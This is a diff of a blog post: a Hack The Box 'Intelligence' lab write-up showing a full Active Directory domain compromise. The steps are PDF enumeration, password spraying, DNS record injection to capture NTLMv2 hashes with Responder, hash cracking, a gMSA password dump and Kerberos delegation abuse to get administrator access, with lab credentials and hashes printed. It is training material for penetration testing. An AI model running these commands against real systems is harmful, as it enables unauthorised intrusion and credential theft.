@@ -1,19 +1,21 @@
 ---
 layout: post
 title:  "Hack The Box - Intelligence - Writeup"
-date:   2000-01-01 07:00:00 +0200
+date:   2020-01-01 07:00:00 +0200
 tags: ["Hack The Box","OSCP"]
 ---
 {% assign imgDir="HTB-Intelligence-Writeup" %}
 
-TODO: Redo the dates and timestamps
+TODO(Maybe): Redo the dates and timestamps
 
 # Introduction
-The hack the box machine "Intelligence" is a medium machine which is included in [TJnull's OSCP Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159). Exploiting this machine requires knowledge in the areas of 
+The hack the box machine "Intelligence" is a medium machine which is included in [TJnull's OSCP Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159). Exploiting this machine requires knowledge in the areas of metadata extraction, automatic content inspection of PDF files, SMB brute forcing, Active Directory enumeration and Active Directory exploitation.
+
+Through enumeration with `nmap`, it is possible to discover that the target is a Windows host with a large amount of open ports. The target hosts a web application which contains uploaded PDF files with predictable names. By guessing the names of other PDF files, it is possible to discover a large amount of uploaded files. The metadata of the PDF files reveal valid usernames and one of the PDF files discloses the default password for new accounts. A list of usernames can be generated and used in a brute force attack against the SMB service of the machine. This reveals that the `Tiffany.Molina` user still uses the default password.
 
 <img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">
 
-By enumerating the target, it is possible to discover 
+The compromised user can then be used to access SMB shares and find a Powershell script which is executed every 5 minutes. This script performs authenticated web requests to DNS records where the domain names starts with the string "web". The `Tiffany.Molina` user can inject such a DNS record which points to the attacker machine. It is then possible to intercept an authenticated request which contains credentials of the `Ted.Graves` user. Using bloodhound, we can discover that the `Ted.Graves` user has the `ReadGMSAPassword` permission on the `SVC_INT` account and that the `SVC_INT` account has the `AllowedToDelegate` permission on the domain controller. It is then possible to read the password of the `SVC_INT` account, log in to this account and use it to access the Domain Controller.
 
 # Exploitation
 We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.85`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that 
@@ -93,13 +95,33 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 252.47 seconds
 {% endhighlight %}
 
-TODO: Add images of the web site. Explain why we create the python script
+Since we saw that the domain names x and x, we can add them to our /etc/hosts file. 
 TODO: Add intelligence.htb and dc.intelligence.htb to /etc/hosts
+
+Next, we need to start investigating the ports. We can start with the web applications since these often constitute a larger attack surface than other services. We have web applications on port x, x and x. The web application on port 80 is RPC over http and we can thus ignore it(TODO:Check). The other two results in a x page and a `404 Not Found`, as can be seen below.
+
+![port5985](/assets/{{ imgDir }}/port5985.png)
+
+![port80](/assets/{{ imgDir }}/port80.png)
+
+TODO: Add images of the web site. Explain why we create the python script
+
+If we scroll down, we can also find a subscription service and two download buttons.
+
+![port80_email](/assets/{{ imgDir }}/port80_email.png)
+
+![port80_download](/assets/{{ imgDir }}/port80_download.png)
+
+The download buttons links to the pages [http://10.10.10.248/documents/2020-01-01-upload.pdf](http://10.10.10.248/documents/2020-01-01-upload.pdf) and [http://10.10.10.248/documents/2020-12-15-upload.pdf](http://10.10.10.248/documents/2020-12-15-upload.pdf) which are two PDF files containing uninteresting information.
+
+![port80_pdf](/assets/{{ imgDir }}/port80_pdf.png)
+
+An interesting aspect of these links is that the only unpredictable characters they contain, are the upload date. We could strongly suspect that other documents could have been uploaded to the web site at other dates. However, manually guessing upload dates is slow as we would need to type every date manually. Instead, we can automate out guesses using a Python script below. At line x to x, we se the target to attack as well as the start and stop date. The two links we already know were uploaded in 2020 and we thus choice to check for any uploads from 2019 to 2021.
 
 {% highlight python linenos %}
 import datetime, requests
 
-#Parameters
+# Parameters
 baseURL = "http://10.10.10.248/"
 start = datetime.datetime(2019,1,1)
 stop = datetime.datetime(2022,1,1)
@@ -121,6 +143,8 @@ for date in dates:
 		with open(filename, 'wb') as f:
 		    f.write(response.content)
 {% endhighlight %}
+
+At line x, we calculate the number of days between the start and stop date we specified earlier. Then, at line x, we use list comprehension to generate a list of all the dates we want to investigate. At line x, we format the list of dates to the format we saw in the links. Then, we iterate through all dates using a for loop. In the for loop, we use a print statement to let the user know which date we are currently investing. Note that we use `end=\r` to keep the output on one line which auto-updates. The next two lines, constructs a link using a date and sends a request using this link. Then, at line x to x, we check if the status code was `200 OK`. If this is the case, we have found a valid PDF and we write it to a file. 
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -146,6 +170,8 @@ for date in dates:
 ┌──(kali㉿kali)-[/tmp/x]
 └─$ 
 {% endhighlight %}
+
+Running the script results in a large amount of identified PDFs. There are two things we could check for each PDF. The first is the metadata and the second is the actual content. We can check the metadata using `exiftool` as demonstrated below. Upon doing this for one of our PDFs, we discover that there is a metadata tag named "Creator" whcih contains the username of the user which created the file. By executing `exiftool *.pdf | grep "Creator"` we can obtain a list of each PDF file's creator.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -201,6 +227,8 @@ Creator                         : @@@Richard.Williams@@@
 {% endhighlight %}
 
 
+We can use `awk` to extract all the usernames from these lines and create a list of usernames. We use the `-F` flag to specify that the colon character should be the field separator and the [gsub](https://www.gnu.org/software/gawk/manual/html_node/String-Functions.html) function to remove any spaces. Then, we use `print $2` to select the second field in each line, which will be a username since the field separator is the colon character. We store the resulting list of usernames in a file named "users.txt".
+
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
 └─$ @@exiftool *.pdf | grep "Creator" | awk -F ":" '{gsub(/ /,""); print $2}' > users.txt@@
@@ -222,6 +250,8 @@ Jose.Williams
 └─$
 {% endhighlight %}
 
+Another thing we could with these PDF files is to inspect their content. We can use a tool such as [abiword](https://github.com/AbiWord/abiword) to extract the text of a PDF as demonstrated below. We use the `--to` flag to specify that we want the tool to convert the PDF content to textual data and the `--to-name` flag to specify that the output should be written to the file which has the file descriptor `1`. In UNIX-based file systems, the file descriptors 0, 1 and 2 corresponds to STDIN, STDOUT and STDERR. As such, this flag ensures that the output is written to standard output rather than a file.
+
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
 └─$ @@abiword --to=txt --to-name=fd://1 2020-01-01.pdf@@
@@ -235,9 +265,11 @@ tempora. Magnam etincidunt consectetur sed dolorem amet labore.
 Adipisci est eius voluptatem. Adipisci sed dolorem ut etincidunt non etincidunt
 numquam. Quisquam sit tempora voluptatem. Numquam ut dolore consectetur dolor quaerat quisquam. Tempora dolorem dolore dolore etincidunt modi.
 Magnam aliquam quisquam porro. Modi est ut numquam dolor dolorem neque.
+{% endhighlight %}
 
+We can use this technique to extract the text of all pdf documents to standard output as performed below. We can use `grep` to search for keywords such as "password", to find interesting information. To get some context for our matches, we can use the `-C` flag to display a couple of lines before and after each matching line rather than only the matching line. Upon searching the output using `grep`, we discover that `NewIntelligenceCorpUser9876` is a default password which users should change after logging in.
 
-                                                                                                                    
+{% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
 └─$ @@abiword --to=txt --to-name=fd://1 *.pdf | grep -C 5 "password"@@
 
@@ -256,10 +288,9 @@ Dolor quisquam aliquam amet numquam modi.
 Sit porro tempora sit adipisci porro sit quiquia. Ut dolor modi magnam ipsum
 velit magnam. Ipsum ut numquam tempora sit. Tempora eius est voluptatem.
 Dolorem numquam consectetur etincidunt etincidunt sed. Neque magnam ipsum modi sit aliquam amet. Amet consectetur modi quisquam adipisci aliquam
-                                                                                                                    
-┌──(kali㉿kali)-[/tmp/x]
-└─$
 {% endhighlight %}
+
+During our nmap scan, we discovered that the SMB ports 139 and 445, were open. Since SMB allows users to authenitcate before accessing shares, we could check if any of the users still use the default password. This can be performed using `crackmapexec`, as shown below. From the output of the command, we discover that the user `Tiffany.Molina` still hasn't changed her password!
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -330,10 +361,12 @@ SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Dun
 SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
 SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
 SMB         10.10.10.248    445    DC               [@@@+@@@] @@@intelligence.htb\Tiffany.Molina@@@:@@@NewIntelligenceCorpUser9876@@@ 
-                                                                                                                                                                                                                                            
+
 ┌──(kali㉿kali)-[/tmp/x]
 └─$
 {% endhighlight %}
+
+We can use the newly discovered credentials to check what SMB shares the `Tiffany.Molina` has access to. This results in the discovery of the 4 non-standard shares `IT`, `NETLOGON`, `SYSVOL` and `Users`. We can use `smbclient` to connect to each of these shares as `Tiffany.Molina` and check if there are any interesting files. Upon doing this, we discover a file named "downdetector.ps1" on the `IT` share. We can download this file by executing `get downdetector.ps1`.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -365,9 +398,8 @@ smb: \> @@get downdetector.ps1@@
 smb: \> @@exit
 {% endhighlight %}
 
-TODO: Explain endianness
-
-"ABC" 65,66,67,00. 0x65666700. 0x00676665
+Since this file originated from a Windows host, it is encoded as little-[endian](https://en.wikipedia.org/wiki/Endianness) [UTF-16](https://en.wikipedia.org/wiki/UTF-16) with CRLF line terminators. If we want to open this file in a text editor, such as nano, we will need to convert it to a Linux friendly format. We can do this using the `dos2unix` tool, as performed below.
+TODO(maybe): Explain endianness "ABC" 65,66,67,00. 0x65666700. 0x00676665
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -394,15 +426,13 @@ foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=Doma
 	} catch {}
 }
 {% endhighlight %}
-TODO: explain code
 
-For loop loops through each child object of `AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb` where the object name starts with the string "web". The child items of `AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb` are a list of domains where each domain which starts "web" is a domain which should be ensured is up and running. Inside of the for loop, the [Invoke-WebRequest]() cmdlet is used to send a web request to each object we are iterating over in the for loop. The if clause at line x, checks if the response code for the response of this request does not equal a `200 OK`. If this is not the case, the web site is not running properly and an email is sent to the user `Ted Graves` to let him know that there is an issue with this particular web site. Something interesting to note here is that the Invoke-WebRequest cmdlet at line x is executed with the `-UseDefaultCredentials`. If we get a hold of these credentials, we might be able to use them elsewhere.
+From a comment at the top of the `downdetector.ps1` script, shown above, we can see that this script is executed every 5 minute. The script contains a for loop which iterates through each child object of `AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb` where the object name starts with the string "web". The child items of `AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb` are a list of domains where each domain which starts "web" is a domain which should be ensured is up and running. Inside of the for loop, the [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest) cmdlet is used to send a web request to each object we are iterating over in the for loop. The if clause at line 6, checks if the response code for the response of this request does not equal a `200 OK`. If this is not the case, the web site is not running properly and an email is sent to the user `Ted Graves` to let him know that there is an issue with this particular web site. Something interesting to note here is that the Invoke-WebRequest cmdlet at line 5 is executed with the `-UseDefaultCredentials` flag. If we get a hold of these credentials, we might be able to use them elsewhere.
 
-Since we now that the for loop iterates over all DNS records in `AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb` starting with the string "web", we could try to inject our own dns record which starts with this string and points to our attacker machine. This way, we could leak the credentials of the request. A good tool for this is [dnstool](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) which was developed by x.
+Since we know that the for loop iterates over all DNS records in `AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb` starting with the string "web", we could try to inject our own DNS record which starts with this string and points to our attacker machine. This way, we could leak the credentials of the request. A good tool for this is [dnstool](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) which was developed by [
+Dirk-jan Mollema](https://twitter.com/_dirkjan).
 
-We run this tool as demonstrated below. We use the `-u` and `-p` flags to provide the tool with the credentials of the `Tiffany Molina` user which we compromised earlier. We use the `--action` flag to specify that we want to add a new DNS record and the `--record` flag to specify that the record name should be "web-evil" since this name starts with the string "web". Then, we specify that this record name should resolve to our ip address using the `--data` flag and that it is an [A record]() using the `-type` flag. The last argument is simply the server we are targetting. From the output of the command, we see that the injection of the new record is successful! This means that the `Tiffany Molina` user has modification rights on this active directory object and that we should be able to trick the DownDetector.ps1 script into sending us authenticated web requests.
-
-https://en.wikipedia.org/wiki/List_of_DNS_record_types
+We run this tool as demonstrated below. We use the `-u` and `-p` flags to provide the tool with the credentials of the `Tiffany Molina` user which we compromised earlier. We use the `--action` flag to specify that we want to add a new DNS record and the `--record` flag to specify that the record name should be "web-evil" since this name starts with the string "web". Then, we specify that this record name should resolve to our ip address using the `--data` flag and that it is an A record using the `-type` flag.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -431,7 +461,9 @@ dnstool.py                                                 100%[================
 └─$ 
 {% endhighlight %}
 
-The next step is to catch one of the authenticated web requests. We can do this using responder as shown below. We use the `-I` flag to specify a network interface to listen on. In our case, this is `tun0` since this is the network interface which is facing the Hack The Box lab environment.
+There are a varaiety of [DNS record types](https://en.wikipedia.org/wiki/List_of_DNS_record_types). The A record type is the of the most common and maps a domain name to an IPv4 adress. The last argument is simply the server we are targetting. From the output of the command, we see that the injection of the new record is successful! This means that the `Tiffany Molina` user has modification rights on this Active Directory object and that we should be able to trick the `downDetector.ps1` script into sending us authenticated web requests.
+
+The next step is to catch one of the authenticated web requests. We can do this using [responder](https://github.com/SpiderLabs/Responder) as shown below. We use the `-I` flag to specify a network interface to listen on. In our case, this is `tun0` since this is the network interface which is facing the Hack The Box lab environment.
 
 {% highlight none linenos %}                                              
 ┌──(kali㉿kali)-[/tmp/x]
@@ -456,7 +488,7 @@ The next step is to catch one of the authenticated web requests. We can do this 
     DHCP                       [OFF]
 
 [+] Servers:
-    HTTP server                [ON]
+    @@@HTTP server@@@                [@@@ON@@@]
     HTTPS server               [ON]
     WPAD proxy                 [OFF]
     Auth proxy                 [OFF]
@@ -505,13 +537,13 @@ The next step is to catch one of the authenticated web requests. We can do this 
 [HTTP] NTLMv2 @@@Hash@@@     : @@@Ted.Graves::intelligence:1c47423e00010562:C83C77FCFC30BAF8877ED75A4D91B2AB:010100000000000027681B87FA4CD801AC8DD0EFE91FC03300000000020008005700590053004E0001001E00570049004E002D00370042005300480056004F004F004F004B004F004E00040014005700590053004E002E004C004F00430041004C0003003400570049004E002D00370042005300480056004F004F004F004B004F004E002E005700590053004E002E004C004F00430041004C00050014005700590053004E002E004C004F00430041004C000800300030000000000000000000000000200000D2ABF102A325442058319BD8B1CC36A197486CE75252F9AD0CB436C324745E6A0A0010000000000000000000000000000000000009003C0048005400540050002F007700650062002D006500760069006C002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000@@@
 {% endhighlight %}
 
-After a coupleo f minutes, we receive a web request which contains credentials for the `Ted Graves` user. We can try to crack these using hashcat as demonstrated below. Note  that -m 5600 is a NTLM hash, See ref here. We use the rockyou wordlist since it is relatively large and popular.
-
-https://hashcat.net/wiki/doku.php?id=example_hashes
-
-TODO: Include echo ... > hash
+After a couple of minutes, we receive a web request which contains credentials for the `Ted Graves` user. We can try to crack these using hashcat as demonstrated below. We specify the hash type `5600` using the `-m` flag. This number corresponds to the hash type `NTLMv2` and was obtained from the [official hashcat website](https://hashcat.net/wiki/doku.php?id=example_hashes). Finally, we use the [rockyou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) wordlist since it is a relatively large and well-known wordlist of common password.
 
 {% highlight none linenos %}
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@cat hash@@
+@@@Ted.Graves::intelligence:1c47423e00010562:C83C77FCFC30BAF8877ED75A4D91B2AB:010100000000000027681B87FA4CD801AC8DD0EFE91FC03300000000020008005700590053004E0001001E00570049004E002D00370042005300480056004F004F004F004B004F004E00040014005700590053004E002E004C004F00430041004C0003003400570049004E002D00370042005300480056004F004F004F004B004F004E002E005700590053004E002E004C004F00430041004C00050014005700590053004E002E004C004F00430041004C000800300030000000000000000000000000200000D2ABF102A325442058319BD8B1CC36A197486CE75252F9AD0CB436C324745E6A0A0010000000000000000000000000000000000009003C0048005400540050002F007700650062002D006500760069006C002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000@@@
+
 ┌──(kali㉿kali)-[/tmp/x]
 └─$ @@hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt@@
 hashcat (v6.2.5) starting
@@ -541,12 +573,8 @@ Started: Sun Apr 10 05:49:43 2022
 Stopped: Sun Apr 10 05:50:44 2022
 {% endhighlight %}
 
-After around a minute, the hash is cracked and we obtain the password `Mr.Teddy`. Next, we try to enumerate this user's capabilities using bloodhound.
+After around a minute, the hash is cracked and we obtain the password `Mr.Teddy`. Next, we will analyze this user's and the previous user's Active Directory permissions using [bloodhound](https://github.com/BloodHoundAD/BloodHound). However, before we can analyze any information, we must first extract it from the LDAP server on the target host. We can do this using [bloodhound-python](https://github.com/fox-it/BloodHound.py) as demonstrated below. From the output of the tool, we can see that it found 2 computers, 43 users and 55 groups in the domain. It also provides us with the names of the two computers it identified. All of the extracted information are stored in a set of JSON files which can be imported in bloodhound.
 
-
-Add "rm *"?
-
-The bloodhound script finds 2 computers, 43 users and 55 groups in the domain. It also provides us with the names of the two computers it identified.
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
 └─$ @@bloodhound-python -c ALL -u TED.GRAVES -p Mr.Teddy -d intelligence.htb -dc intelligence.htb -ns 10.10.10.248@@
@@ -574,8 +602,7 @@ INFO: Done in 00M 13S
 └─$ 
 {% endhighlight %}
 
-
-Next, we will import the output files into bloodhound to analyze them. we start neo4j (the bloodhound db) by executing "neo4j start". Then we execute "bloodhound" to start bloodhound.
+The next step is to import the JSON files into bloodhound to analyze them. We start the bloodhound graph database by executing `start neo4j` and bloodhound by executing `bloodhound`.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -599,39 +626,25 @@ There may be a short delay until the server is ready.
 [...]
 {% endhighlight %}
 
-We login. If you don't have these credentials set up, TODO..
+Once bloodhound starts, we provide it with the credentials for accessing the Neo4j database. If it is your first time using the Neo4j database, you can normally log in to the Neo4j web interface at [http://127.0.0.1:7474/browser/](http://127.0.0.1:7474/browser/) with the username `neo4j` and password `neo4j`. Once logged in, you can set the password to something more secure and then use that password in bloodhound. 
 
 ![bLogin](/assets/{{ imgDir }}/bLogin.png)
 
-
-We click upload
-
 ![bUpload](/assets/{{ imgDir }}/bUpload.png)
 
-
-We select our json files and press "Open"
+Once we have logged in, we press the upload button, select the JSON files and press the `Open` button.
 
 ![bSelect](/assets/{{ imgDir }}/bSelect.png)
 
-
-We search for ted graves, press enter.
 ![bSearch](/assets/{{ imgDir }}/bSearch.png)
 
-
-We find 1 group membership under "outbound" 
-
-Clicking it shows us that ted is a member of the IT-support group which has x right on the SVC account. This means that we can read the SVC account's password and thus compromise it.
-
-Right click.
+Next, we use the search bar ar the top-left corner to search for the `Ted.Graves` user we compromised. Once the `TED.GRAVES@INTELLIGENCE.HTB` suggestion pops up, we press enter to load this user. We then right click the icon of the user and select `Mark User as Owned` to let bloodhound know that we have already compromised this user. This adds a skull symbol to the icon. We do the same thing for the `Tiffany.Molina` user.
 
 ![bOwned1](/assets/{{ imgDir }}/bOwned.png)
 
-Changes the icon to contain a skull
-
 ![bOwned2](/assets/{{ imgDir }}/bOwned2.png)
 
-
-We do the same with tiffany. Then, we navigate to the analysis tab and press 
+Once we have marked both of our compromised users as owned, we navigate to the `Analysis` tab and press `Shortest Path from Owned Principals`. We then select the domain `INTELLIGENCE.HTB` and `TED.GRAVES@INTELLIGENCE.HTB` in the two resulting popups.
 
 ![bShortest](/assets/{{ imgDir }}/bShortest.png)
 
@@ -641,11 +654,11 @@ We do the same with tiffany. Then, we navigate to the analysis tab and press
 
 ![bShortest3](/assets/{{ imgDir }}/bShortest3.png)
 
-TODO: Explain the graph and the vulns (I.e the attack plan)
+ After some time, bloodhound shows us a path from the `Ted.Graves` user to the domain computer, as can be seen above. This graph shows us that `Ted.Graves` is a member of the IT-support group which has the `ReadGMSAPassword` permission on the `SVC_INT@INTELLIGENCE.HTB` account. This means that we can read the `SVC_INT@INTELLIGENCE.HTB` account's password and thus compromise it.
 
-If we go to the SVC node, we can find the SPN
+The graph also shows that the `SVC_INT@INTELLIGENCE.HTB` account has the `AllowedToDelegate` permission on the Domain Controller! This means that `SVC_INT@INTELLIGENCE.HTB` is allowed to perform [Kerberos Constrained Delegation](https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview) on the target computer. Consequently, the `SVC_INT@INTELLIGENCE.HTB` user can impersonate any user when accessing any service running on the target computer. As such, we could abuse this permission to compromise the `administrator` user which has access to the domain controller.
 
-![bAllowedToDelegate](/assets/{{ imgDir }}/bAllowedToDelegate.png)
+To read the password of the `SVC_INT@INTELLIGENCE.HTB` account, we can use the Python script [gMSADumper.py](https://github.com/micahvandeusen/gMSADumper) created by [Micah Van Deusen](https://twitter.com/micahvandeusen), as performed below. We use the `-u` and `-p` flags to authenticate as the `Ted.Graves`. In addition, we use the `-l` flag to specify the LDAP server we want to communicate with and `-d` to specify the domain we are targetting. As can be seen in the output of the command, this discloses the password hash of the `SVC_INT@INTELLIGENCE.HTB` account!
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -663,12 +676,18 @@ gMSADumper.py                100%[==============================================
 
                                                                                                                     
 ┌──(kali㉿kali)-[/tmp/x]
-└─$ @@python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb@@
+└─$ @@python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb@@
 Users or groups who can read password for svc_int$:
  > DC$
  > itsupport
 svc_int$:::@@@a5fd76c71109b0b483abe309fbc92ccb@@@
 {% endhighlight %}
+
+Before we can abuse the `AllowedToDelegate` permission, we need to know the [Service Principal Name](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) (SPN) of the domain controller. We can find this information in bloodhound by selecting the `SVC_INT@INTELLIGENCE.HTB` node, clicking the `Node Info` tab and checking the `Allowed To Delegate` field. By looking at this field, we can discover that the SPN of the domain controller is `WWW/dc.intelligence.htb`.
+
+![bAllowedToDelegate](/assets/{{ imgDir }}/bAllowedToDelegate.png)
+
+Now that we have the SPN of the domain controller, we should have everything we need to get a [Ticket Granting Ticket](https://docs.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-tickets) (TGT) for the `Administrator` user. In theory, we could generate this TGT with impacket as demonstrated below. We specify the target host with the `-spn` flag, the password hash for authentication with the `-hashes`, the ip of the domain controller with the `-dc-ip` flag and the target account to compromise with the `-impersonate` flag. After the flags, we specify the user we would like to authenticate as, using the hash we provided in the `-hashes` flag. Note that the format of the hash provided to the `-hashes` flag, should be `LMHASH:NTHASH`. However, since the hash we leaked for the `svc_int` user did not have an LM part, we can leave teh `LMHASH` part bank.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -678,6 +697,8 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 [*] Getting TGT for user
 Kerberos SessionError: @@@KRB_AP_ERR_SKEW@@@(@@@Clock skew too great@@@)
 {% endhighlight %}
+
+Upon running the command, we get the error message `Clock skew too great`. This is because Kerberos is time dependent and the clock of the host we are targetting is 7 hours different from ours, as we saw when we scanned the host with NMAP. We can fix this by syncing our time with the time of the target host. To do this, we must first deactivate automatic time synchronization by executing `timedatectl set-ntp 0`. Then, we can sync our time with the time of the target host by executing `sudo ntpdate -s intelligence.htb`. Once we have synchronized our time, we can reexecute the command for generating a TGT.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -704,10 +725,9 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 -rw-r--r-- 1 kali kali 1.6K Apr 23 21:47 @@@administrator.ccache@@@
 [...]
 {% endhighlight %}
-Todo: Change 'ls' to 'ls -l'
 
+This time, we do not get an error and a TGT is generated. The script automatically write this TGT to a file named "administrator.ccache". The next step is to use this TGT to log in to the domain controller as the `Administrator` user using [wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py).
 
-Next, we create an environment variable named "KRB5CCNAME" which points to the file `administrator.ccache` which contains our tgt.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -725,4 +745,7 @@ C:\>@@whoami@@
 
 C:\>
 {% endhighlight %}
+
+To ensure that we use the generated TGT for Kerberos authentication, we create an environment variable named "KRB5CCNAME" which points to the `administrator.ccache` file. Then, we run `wmiexec` with the `-k` and `-no-pass` flags, to instruct it to authenticate using Kerberos. We also provide it with the target user and host as the last argument `administrator@dc.intelligence.htb`. Upon execution of the `wmiexec` command, we obtain administrative access to the domain controller, meaning that we have successfully compromised the entire domain!
+
 
